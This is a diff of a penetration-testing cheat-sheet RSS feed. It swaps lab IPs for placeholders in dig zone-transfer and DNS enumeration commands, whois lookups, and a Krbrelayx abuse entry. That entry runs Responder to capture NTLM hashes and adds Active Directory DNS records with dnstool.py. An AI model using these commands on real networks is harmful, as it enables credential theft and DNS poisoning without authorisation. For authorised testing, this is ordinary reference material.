@@ -12,21 +12,21 @@
       <link>https://tldrbins.github.io/dns_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/dns_enum/</guid>
-      <description> Zone Transfer dig +noall +answer example.com axfr @10.10.11.10 Domain Discovery dig +noall +answer @10.10.11.10 example.com dig +noall +answer @10.10.11.10 -x 10.10.11.10 dig +noall +answer @10.10.11.10 +short example.com any dig +noall +answer @10.10.11.10 -t NS example.com </description>
+      <description>Zone Transfer dig +noall +answer &amp;lt;DOMAIN&amp;gt; axfr @&amp;lt;TARGET&amp;gt; Domain Discovery dig +noall +answer @&amp;lt;TARGET&amp;gt; &amp;lt;DOMAIN&amp;gt; dig +noall +answer @&amp;lt;TARGET&amp;gt; -x &amp;lt;TARGET&amp;gt; dig +noall +answer @&amp;lt;TARGET&amp;gt; +short &amp;lt;DOMAIN&amp;gt; any dig +noall +answer @&amp;lt;TARGET&amp;gt; -t NS &amp;lt;DOMAIN&amp;gt; </description>
     </item>
     <item>
       <title>Krbrelayx</title>
       <link>https://tldrbins.github.io/krbrelayx/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/krbrelayx/</guid>
-      <description>Abuse #1: Add Active Directory Integrated DNS records via LDAP Linux # Capture NTLM hash sudo responder -I tun0 python3 dnstool.py -u &amp;lt;DOMAIN&amp;gt;\\&amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --action add --record test --data 10.10.14.10 --type A 10.10.11.10 Ref: krbrelayx tools</description>
+      <description>Abuse #1: Add Active Directory Integrated DNS records via LDAP Linux # Capture NTLM hash sudo responder -I tun0 python3 dnstool.py -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --action add --record test --data &amp;lt;LOCAL_IP&amp;gt; --type A &amp;lt;DOMAIN&amp;gt; Ref: krbrelayx tools</description>
     </item>
     <item>
       <title>whois</title>
       <link>https://tldrbins.github.io/whois/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/whois/</guid>
-      <description> WHOIS # General whois example.com # With specific server whois -h &amp;lt;WHOIS_SERVER&amp;gt; -p 43 example.com </description>
+      <description>WHOIS # General whois &amp;lt;DOMAIN&amp;gt; # With specific server whois -h &amp;lt;WHOIS_SERVER&amp;gt; -p 43 &amp;lt;DOMAIN&amp;gt; </description>
     </item>
   </channel>
 </rss>
